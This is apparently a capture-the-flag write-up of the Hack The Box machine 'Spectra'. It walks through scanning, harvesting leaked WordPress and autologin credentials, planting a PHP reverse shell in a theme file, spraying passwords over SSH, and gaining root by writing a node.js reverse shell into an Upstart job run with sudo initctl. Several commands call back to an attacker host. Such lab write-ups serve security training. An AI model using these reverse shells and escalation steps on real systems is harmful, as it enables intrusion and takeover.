<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-15 10:10 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.229
Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.052s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65532</span> closed ports
Reason: <span style="color:#ae81ff">65532</span> resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
80/tcp   open  http    syn-ack ttl <span style="color:#ae81ff">63</span> nginx 1.17.4
3306/tcp open  mysql   syn-ack ttl <span style="color:#ae81ff">63</span> MySQL <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 123.14 seconds
</code></pre></div><p>MySQL service is normally tied to 127.0.0.1, but <code>nmap</code> already identified that I have no access there.</p>
<p>Running a script scan didn&rsquo;t find any interesting information.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---spectrahtb">TCP 80 - spectra.htb</h3>
<p>The site appears to be under development.</p>
<p><img class="img-container" src="imgs/image-20210515212024368.png" alt="image-20210515212024368"  />
</p>
<p>Inspecting page source discovers a hostname and two directories:</p>
<ul>
<li><a href="http://spectra.htb/main/index.php">http://spectra.htb/main/index.php</a></li>
<li><a href="http://spectra.htb/testing/index.php">http://spectra.htb/testing/index.php</a></li>
</ul>
<p><img class="img-container" src="imgs/image-20210515212038877.png" alt="image-20210515212038877"  />
</p>
<p>I&rsquo;ll update my <code>/etc/hosts</code> with the hostname.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ echo <span style="color:#e6db74">&#39;10.10.10.229 spectra.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>Poking with <code>curl</code>, shows that with or without the hostname it&rsquo;s the same site.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «~» «10.10.14.9» 
$ curl -s http://spectra.htb/ | wc -c
<span style="color:#ae81ff">283</span>
→ root@kali «~» «10.10.14.9» 
$ curl -s http://10.10.10.229 | wc -c
<span style="color:#ae81ff">283</span>
</code></pre></div><p>Clicking on &ldquo;<strong>Software Issue Tracker</strong>&rdquo;, redirects to a WordPress site and nothing interesting except one default post by administrator.</p>
<p><img class="img-container" src="imgs/image-20210626224157109.png" alt="image-20210626224157109"  />
</p>
<p>Visiting &ldquo;<strong>Test</strong>&rdquo;, the site page shows an error message about database connection.</p>
<p><img class="img-container" src="imgs/image-20210515214125642.png" alt="image-20210515214125642"  />
</p>
<p>Removing <code>index.php</code> from URL, discovers that this page has directory listing is enabled.</p>
<p><img class="img-container" src="imgs/image-20210515221118144.png" alt="image-20210515221118144"  />
</p>
<p>The  <code>wp-config.php.save</code> file draws my attention. It contains a set of database credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ curl http://spectra.htb/testing/wp-config.php.save
&lt;?php
...&lt;SNIP&gt;...

define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database username */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;devtest&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database password */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;devteam01&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL hostname */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">)</span>;
...&lt;SNIP&gt;...
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nginx">Shell as nginx</h3>
<h4 id="wp-admin-dashboard">WP-Admin Dashboard</h4>
<p>The database password works with administrator account (<code>administrator:devteam01</code>), it allows me to access the admin dashboard.</p>
<p><img class="img-container" src="imgs/image-20210626225944808.png" alt="image-20210626225944808"  />
</p>
<h4 id="injecting-reverse-shell">Injecting Reverse Shell</h4>
<p>Armed with administrator access, I can inject a malicious PHP code into one of the available themes files and execute it by visiting the full URL of the theme file. In this case, I&rsquo;ll inject a <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> script in <code>404.php</code> file of the Twenty Nineteen theme. The file can be found at <strong>Appearance</strong> &gt; <strong>Theme Editor</strong>.</p>
<p><img class="img-container" src="imgs/image-20210515231108016.png" alt="image-20210515231108016"  />
</p>
<p>I&rsquo;ll access this URL to get a shell: <code>http://spectra.htb/main/wp-content/themes/twentynineteen/404.php</code>, but it returns an error message pointing on line 12.</p>
<p><img class="img-container" src="imgs/image-20210515231346411.png" alt="image-20210515231346411"  />
</p>
<p>I&rsquo;m able to resolve the error by commenting out the line 12.</p>
<p><img class="img-container" src="imgs/image-20210515231422348.png" alt="image-20210515231422348"  />
</p>
<p>This time, I&rsquo;ll trigger the reverse shell using <code>curl</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
</code></pre></div><p>On my listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.21<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.229<span style="color:#f92672">]</span> <span style="color:#ae81ff">35166</span>
Linux spectra 5.4.66+ <span style="color:#75715e">#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux</span>
 09:14:42 up 10:53,  <span style="color:#ae81ff">0</span> users,  load average: 0.02, 0.04, 0.00
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid<span style="color:#f92672">=</span>20155<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span>
$ hostname
spectra
</code></pre></div><h4 id="shell-upgrade">Shell upgrade</h4>
<p>My current shell doesn&rsquo;t have PATH variable set, so I have to use the full path to upgrade my shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ which python3
which: no python3 in <span style="color:#f92672">((</span>null<span style="color:#f92672">))</span>
$ ls /usr/bin/ | grep python 
python
python-config
python-wrapper
python2
python2.7
python3
python3.6
python3.6m
$ /usr/bin/python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
nginx@spectra / $ export TERM<span style="color:#f92672">=</span>xterm
nginx@spectra / $ ^Z
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7285</span> suspended  nc -nvlp <span style="color:#ae81ff">9001</span>
→ root@kali «spectra» «10.10.14.21» 
$ stty raw -echo; fg
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7285</span> continued  nc -nvlp <span style="color:#ae81ff">9001</span>

nginx@spectra / $ 
</code></pre></div><p>To resolve the <code>((null))</code> message, I&rsquo;ll add <code>/usr/bin</code> to current PATH variable.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ env
TERM<span style="color:#f92672">=</span>xterm
USER<span style="color:#f92672">=</span>nginx
PWD<span style="color:#f92672">=</span>/
SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
HOME<span style="color:#f92672">=</span>/home/nginx
_<span style="color:#f92672">=</span>/usr/bin/env
nginx@spectra / $ export PATH<span style="color:#f92672">=</span>$PATH:/usr/bin 
nginx@spectra / $ which python
/usr/local/bin/python
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-katie">Shell as katie</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>There are 4 users with login shell in this machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /etc/passwd | grep sh$  
root:x:0:0:root:/root:/bin/bash
chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
nginx:x:20155:20156::/home/nginx:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
</code></pre></div><p>Enumerating home directory shows the user flag is on  <code>katie</code>&rsquo;s home directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ ls -lR /home 2&gt;/dev/null
...&lt;SNIP&gt;...
/home/katie:
total <span style="color:#ae81ff">8</span>
drwxr-xr-x <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 log
-r-------- <span style="color:#ae81ff">1</span> katie katie   <span style="color:#ae81ff">33</span> Feb  <span style="color:#ae81ff">2</span> 15:57 user.txt
...&lt;SNIP&gt;...
</code></pre></div><p>All the web files are located in <code>/usr/local/share/nginx/html/</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ find / -type f -name wp-config.php 2&gt;/dev/null
/usr/local/share/nginx/html/main/wp-config.php
/usr/local/share/nginx/html/testing/wp-config.php
/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
</code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has different credentials with the one on <code>/testing</code>. I&rsquo;ll grab these credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php
...&lt;SNIP&gt;...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database <span style="color:#66d9ef">for</span> WordPress */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database username */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database password */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;development01&#39;</span> <span style="color:#f92672">)</span>;
...&lt;SNIP&gt;...
</code></pre></div><p>In <code>/opt</code>, there is a file with uncommon extension called <code>autologin.conf.orig</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ cat autologin.conf.orig 
<span style="color:#75715e"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
<span style="color:#75715e"># Use of this source code is governed by a BSD-style license that can be</span>
<span style="color:#75715e"># found in the LICENSE file.</span>
description   <span style="color:#e6db74">&#34;Automatic login at boot&#34;</span>
author        <span style="color:#e6db74">&#34;chromium-os-dev@chromium.org&#34;</span>
<span style="color:#75715e"># After boot-complete starts, the login prompt is visible and is accepting</span>
<span style="color:#75715e"># input.</span>
start on started boot-complete
script
  passwd<span style="color:#f92672">=</span>
  <span style="color:#75715e"># Read password from file. The file may optionally end with a newline.</span>
  <span style="color:#66d9ef">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin; <span style="color:#66d9ef">do</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -e <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/passwd&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
      passwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/passwd&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
      break
    <span style="color:#66d9ef">fi</span>
  <span style="color:#66d9ef">done</span>
  <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>passwd<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
    exit <span style="color:#ae81ff">0</span>
  <span style="color:#66d9ef">fi</span>
...&lt;SNIP&gt;...
</code></pre></div><p>Based on the comments, the file is an autologin script. It looks for <code>passwd</code> file in these directories:</p>
<ul>
<li><code>/mnt/stateful_partition/etc/autologin</code></li>
<li><code>/etc/autologin</code></li>
</ul>
<p>And the <code>passwd</code> file in <code>/etc/autologin/</code> directory contains a password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ ls -l /etc/autologin/             
total <span style="color:#ae81ff">4</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">19</span> Feb  <span style="color:#ae81ff">3</span> 16:43 passwd
nginx@spectra /opt $ cat /etc/autologin/passwd 
SummerHereWeCome!!
</code></pre></div><h4 id="ssh---katie">SSH - katie</h4>
<p>I&rsquo;ll spray <code>SummerHereWeCome!!</code> and <code>development01</code> using <code>crackmapexec</code> to the users who have login shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_8.1
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:devteam01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:development01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:SummerHereWeCome!! Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> katie:devteam01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> katie:development01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> katie:SummerHereWeCome!!
</code></pre></div><p>The password <code>SummerHereWeCome!!</code> works on user <code>katie</code> .</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ ssh katie@10.10.10.229
Password: 
katie@spectra ~ $ id 
uid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20157<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20157<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span>,20158<span style="color:#f92672">(</span>developers<span style="color:#f92672">)</span>
</code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ ls -la
total <span style="color:#ae81ff">36</span>
drwxr-xr-x <span style="color:#ae81ff">5</span> katie katie <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">15</span> 12:17 .
drwxr-xr-x <span style="color:#ae81ff">8</span> root  root  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">2</span> 15:55 ..
lrwxrwxrwx <span style="color:#ae81ff">1</span> root  root     <span style="color:#ae81ff">9</span> Feb  <span style="color:#ae81ff">2</span> 15:55 .bash_history -&gt; /dev/null
-rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">127</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">204</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bash_profile
-rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">551</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bashrc
drwx------ <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">15</span> 12:17 .gnupg
drwx------ <span style="color:#ae81ff">3</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 .pki
drwxr-xr-x <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 log
-r-------- <span style="color:#ae81ff">1</span> katie katie   <span style="color:#ae81ff">33</span> Feb  <span style="color:#ae81ff">2</span> 15:57 user.txt
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration-1">Internal Enumeration</h4>
<p>The first thing I will check if I have the user&rsquo;s password is the sudo rights, and this user has one on <a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it"><code>initctl</code></a>. Unfortunately, <code>initctl</code> is not listed on GTFObins site, so I&rsquo;ll have to look around.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> SETENV: NOPASSWD: /sbin/initctl
</code></pre></div><p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ find / -type f -group developers -ls 2&gt;/dev/null
    <span style="color:#ae81ff">32121</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test6.conf
    <span style="color:#ae81ff">32123</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test7.conf
    <span style="color:#ae81ff">32109</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test3.conf
    <span style="color:#ae81ff">32112</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test4.conf
    <span style="color:#ae81ff">32103</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test.conf
    <span style="color:#ae81ff">32126</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test8.conf
    <span style="color:#ae81ff">32128</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test9.conf
    <span style="color:#ae81ff">32106</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test10.conf
    <span style="color:#ae81ff">32108</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test2.conf
    <span style="color:#ae81ff">32120</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test5.conf
    <span style="color:#ae81ff">32105</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test1.conf
    <span style="color:#ae81ff">23763</span>      <span style="color:#ae81ff">4</span> -rwxrwxr-x   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">251</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /srv/nodetest.js
</code></pre></div><p>Those <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>.  This file itself is not that important here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ cat /etc/init/test.conf 
description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
author      <span style="color:#e6db74">&#34;katie&#34;</span>

start on filesystem or runlevel <span style="color:#f92672">[</span>2345<span style="color:#f92672">]</span>
stop on shutdown

script

    export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
    echo $$ &gt; /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo <span style="color:#e6db74">&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo <span style="color:#e6db74">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
end script
</code></pre></div><h4 id="abusing-sudo-initctl">Abusing sudo initctl</h4>
<p>With sudo privileges and write access on those configuration files, I can perform a command injection to send myself a root shell.</p>
<p>In this write-up, I&rsquo;d like to try injecting a <a href="https://gtfobins.github.io/gtfobins/node/#sudo">node</a> reverse shell.</p>
<p>First, I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
$ cat exploit.conf
description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
author      <span style="color:#e6db74">&#34;katie&#34;</span>

start on filesystem or runlevel <span style="color:#f92672">[</span>2345<span style="color:#f92672">]</span>
stop on shutdown

script

    export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
    echo $$ &gt; /var/run/nodetest.pid
    export RHOST<span style="color:#f92672">=</span>10.10.14.21
    export RPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span>
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node -e <span style="color:#e6db74">&#39;sh = child_process.spawn(&#34;/bin/sh&#34;); net.connect(process.env.RPORT, process.env.RHOST, function () {
</span><span style="color:#e6db74">    this.pipe(sh.stdin);
</span><span style="color:#e6db74">    sh.stdout.pipe(this);
</span><span style="color:#e6db74">    sh.stderr.pipe(this);
</span><span style="color:#e6db74">    })&#39;</span>
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script
</code></pre></div><p>After that, I&rsquo;ll transfer the file to Spectra in <code>/dev/shm</code> directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
$ scp exploit.conf katie@10.10.10.229:/dev/shm
Password:
bash: warning: /home/katie/.bashrc: warning: script from noexec mount; see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
exploit.conf                               100%  <span style="color:#ae81ff">775</span>    13.1KB/s   00:00
</code></pre></div><p>I&rsquo;ll setup a <code>nc</code> listener on my Kali and execute the following command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra /etc/init $ sudo /sbin/initctl stop test5 2&gt;/dev/null; cat /dev/shm/exploit.conf &gt; test5.conf <span style="color:#f92672">&amp;&amp;</span> sudo /sbin/initctl start test5
test5 start/running, process <span style="color:#ae81ff">33889</span>
</code></pre></div><p>If I check my listener, I have a root shell now.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21»
$ nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.21<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.229<span style="color:#f92672">]</span> <span style="color:#ae81ff">37220</span>
id <span style="color:#f92672">&amp;&amp;</span> hostname <span style="color:#f92672">&amp;&amp;</span> ip a
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
spectra
